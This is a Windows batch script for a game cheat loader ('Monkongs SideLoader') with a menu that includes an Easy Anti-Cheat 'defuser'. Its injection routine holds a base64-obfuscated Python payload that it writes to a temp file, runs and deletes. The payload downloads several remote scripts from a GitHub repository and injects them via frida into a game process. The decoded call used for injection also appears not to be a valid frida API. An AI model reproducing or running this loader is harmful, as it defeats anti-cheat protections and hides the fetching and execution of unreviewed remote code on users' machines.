@echo off
cd /d "%~dp0"

color 0F
title Monkongs SideLoader

reg add "HKCU\Console" /v VirtualTerminalLevel /t REG_DWORD /d 1 /f >nul 2>&1
for /f "delims=" %%E in ('echo prompt $E ^| cmd') do set "ESC=%%E"

echo Setting up paths...
set "PATH=%PATH%;%APPDATA%\Python\Python312\Scripts"
set "PATH=%PATH%;%LOCALAPPDATA%\Programs\Python\Python313\Scripts"
set "PATH=%PATH%;C:\Users\%USERNAME%\AppData\Local\Python\pythoncore-3.14-64\Scripts"
set "PATH=%PATH%;%LOCALAPPDATA%\Python\pythoncore-3.14-64\Scripts"

echo.
echo %ESC%[91m----------------------------------%ESC%[0m
echo %ESC%[93mInstalling dependencies...%ESC%[0m
pip install frida frida-tools >nul 2>&1
echo %ESC%[92mReady%ESC%[0m
echo %ESC%[91m----------------------------------%ESC%[0m

setlocal enabledelayedexpansion
set "selected=1"

:menu
cls
call :showmenu
goto getkey

:showmenu
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
 "$s = %selected%; " ^
 "$r = [char]27; " ^
 "Write-Host ''; " ^
 "Write-Host ('  {0}[90m+=========================================+{0}[0m' -f $r); " ^
 "Write-Host ('  {0}[90m#{0}[0m  {0}[91mM{0}[93mO{0}[92mN{0}[96mK{0}[94mO{0}[95mN{0}[91mG{0}[93mS{0}[0m  {0}[92mS{0}[96mI{0}[94mD{0}[95mE{0}[91mL{0}[93mO{0}[92mA{0}[96mD{0}[94mE{0}[95mR{0}[0m  {0}[90m#{0}[0m' -f $r); " ^
 "Write-Host ('  {0}[90m+=========================================+{0}[0m' -f $r); " ^
 "Write-Host ('  {0}[90m#{0}[0m                                         {0}[90m#{0}[0m' -f $r); " ^
 "$opts = @('1. Start M4Quest only','2. Start EAC Defuser only','3. Start Everything','4. PC Mode (EAC Defuse Always On)'); " ^
 "$colors = @('92','96','93','95'); " ^
 "for ($i=0; $i -lt 4; $i++) { " ^
 "  $c = $colors[$i]; " ^
 "  if (($i+1) -eq $s) { " ^
 "    Write-Host ('  {0}[90m#{0}[0m  {0}[97m^>{0}[0m {0}[{1}m{2}{0}[90m#{0}[0m' -f $r,$c,$opts[$i].PadRight(38)) " ^
 "  } else { " ^
 "    Write-Host ('  {0}[90m#{0}[0m    {0}[{1}m{2}{0}[90m#{0}[0m' -f $r,$c,$opts[$i].PadRight(38)) " ^
 "  } " ^
 "} " ^
 "Write-Host ('  {0}[90m#{0}[0m                                         {0}[90m#{0}[0m' -f $r); " ^
 "Write-Host ('  {0}[90m#{0}[0m  {0}[36mUp/Down Navigate  -  Enter Select    {0}[90m#{0}[0m' -f $r); " ^
 "Write-Host ('  {0}[90m+=========================================+{0}[0m' -f $r); " ^
 "Write-Host ''"

exit /b 0

:getkey
for /f "delims=" %%A in ('powershell -NoProfile -Command "$k = $host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown'); Write-Output $k.VirtualKeyCode"') do set "key=%%A"
if "!key!"=="38" (
    set /a selected-=1
    if !selected! lss 1 set "selected=4"
    goto menu
)
if "!key!"=="40" (
    set /a selected+=1
    if !selected! gtr 4 set "selected=1"
    goto menu
)
if "!key!"=="13" goto selected_!selected!
goto getkey

:selected_1
cls
echo.
echo  %ESC%[93mFetching scripts from server...%ESC%[0m
call :runInject quest
pause >nul
goto menu

:selected_2
cls
echo.
echo  %ESC%[93mFetching scripts from server...%ESC%[0m
call :runInject eac
pause >nul
goto menu

:selected_3
cls
echo.
echo  %ESC%[93mFetching scripts from server...%ESC%[0m
call :runInject all
pause >nul
goto menu

:selected_4
cls
echo.
echo  %ESC%[93mFetching scripts from server...%ESC%[0m
call :runInject pcmode
pause >nul
goto menu

:runInject
set "PYTEMP=%TEMP%\monkong_%RANDOM%.py"
powershell -NoProfile -ExecutionPolicy Bypass -Command "[IO.File]::WriteAllText('%PYTEMP%', [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wb3J0IGZyaWRhLCBzeXMsIG9zLCB1cmxsaWIucmVxdWVzdCwgdGltZQoKQkFTRSA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbW9ua29uZ2xpdmUtZGV2L01lbnVTZXJ2ZXJzL21haW4iCgpTQ1JJUFRTID0gewogICAgImJyaWRnZSI6IHsidXJsIjogIi9mcmlkYS1pbDJjcHAtYnJpZGdlLmpzIiwgImFsd2F5cyI6IFRydWV9LAogICAgInN5bWJvbHMiOiB7InVybCI6ICIvc3ltYm9scy50cyIsICJhbHdheXMiOiBUcnVlfSwKICAgICJtZW51IjogeyJ1cmwiOiAiL01vbmtzTWVudS50cyIsICJtb2RlcyI6IFsibWVudSIsICJhbGwiXX0sCiAgICAiZWFjIjogeyJ1cmwiOiAiL2VhYy50cyIsICJtb2RlcyI6IFsiZWFjIiwgImFsbCIsICJwY21vZGUiXX0sCiAgICAicGNtb2RlIjogeyJ1cmwiOiAiL3BjbW9kZS50cyIsICJtb2RlcyI6IFsicGNtb2RlIl19LAogICAgInF1ZXN0IjogeyJ1cmwiOiAiL200cXVlc3QudHMiLCAibW9kZXMiOiBbInF1ZXN0IiwgImFsbCJdfSwKICAgICJycGMiOiB7InVybCI6ICIvZGlzY29yZHJwYy50cyIsICJtb2RlcyI6IFsiYWxsIl19LAp9CgpkZWYgZmV0Y2godXJsKToKICAgICMgVHJ5IC50cyBmaXJzdCwgdGhlbiAuanMgZmFsbGJhY2sKICAgIGZvciBleHQgaW4gWycudHMnLCAnLmpzJ106CiAgICAgICAgdGVzdF91cmwgPSBCQVNFICsgdXJsLnJlcGxhY2UoJy50cycsIGV4dCkucmVwbGFjZSgnLmpzJywgZXh0KQogICAgICAgIHRyeToKICAgICAgICAgICAgciA9IHVybGxpYi5yZXF1ZXN0LlJlcXVlc3QodGVzdF91cmwsIGhlYWRlcnM9eyJVc2VyLUFnZW50IjogIk1vbmtzTWVudS8xLjAifSkKICAgICAgICAgICAgcmV0dXJuIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ociwgdGltZW91dD0xNSkucmVhZCgpLmRlY29kZSgidXRmLTgiKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgY29udGludWUKICAgIHByaW50KCIgIFshXSBGYWlsZWQ6ICIgKyB1cmwpCiAgICByZXR1cm4gTm9uZQoKZGVmIGZpbmRfcHJvY2VzcygpOgogICAgZGV2aWNlID0gZnJpZGEuZ2V0X2xvY2FsX2RldmljZSgpCiAgICBmb3IgcHJvYyBpbiBkZXZpY2UuZW51bWVyYXRlX3Byb2Nlc3NlcygpOgogICAgICAgIGlmIHByb2MubmFtZS5sb3dlcigpID09ICJhbmltYWxjb21wYW55LmV4ZSI6CiAgICAgICAgICAgIHJldHVybiBwcm9jLnBpZAogICAgcmV0dXJuIE5vbmUKCm1vZGUgPSBzeXMuYXJndlsxXSBpZiBsZW4oc3lzLmFyZ3YpID4gMSBlbHNlICJtZW51IgpwcmludCgiXG5bKl0gTW9kZTogIiArIG1vZGUudXBwZXIoKSkKcHJpbnQoIlsqXSBSZWFkaW5nIHdlYiBzdHJlYW0uLi5cbiIpCgp1cmxzID0gW10KZm9yIG5hbWUsIGluZm8gaW4gU0NSSVBUUy5pdGVtcygpOgogICAgYWx3YXlzID0gaW5mby5nZXQoImFsd2F5cyIsIEZhbHNlKQogICAgbW9kZXMgPSBpbmZvLmdldCgibW9kZXMiLCBbXSkKICAgIHVybCA9IGluZm8uZ2V0KCJ1cmwiKQoKICAgIGlmIG5hbWUgPT0gIm1lbnUiOgogICAgICAgIGlmICJtZW51IiBpbiBtb2RlcyBvciAiYWxsIiBpbiBtb2RlczoKICAgICAgICAgICAgdXJscy5hcHBlbmQodXJsKQogICAgZWxzZToKICAgICAgICBpZiBtb2RlIGluIG1vZGVzIG9yIGFsd2F5czoKICAgICAgICAgICAgdXJscy5hcHBlbmQodXJsKQoKcHJpbnQoIlsqXSBMb2FkaW5nICIgKyBzdHIodXJscykpCmZvciB1cmwgaW4gdXJsczoKICAgIHNjcmlwdCA9IGZldGNoKHVybCkKICAgIGlmIHNjcmlwdDoKICAgICAgICBmcmlkYS5ldmFsdWF0ZShzY3JpcHQpCiAgICBlbHNlOgogICAgICAgIHByaW50KCJcblshXSBGYWlsZWQgdG8gZmV0Y2ggIiArIHVybCkKCnRpbWUuc2xlZXAoMik=')))"
python "%PYTEMP%" %1
del /f /q "%PYTEMP%" >nul 2>&1
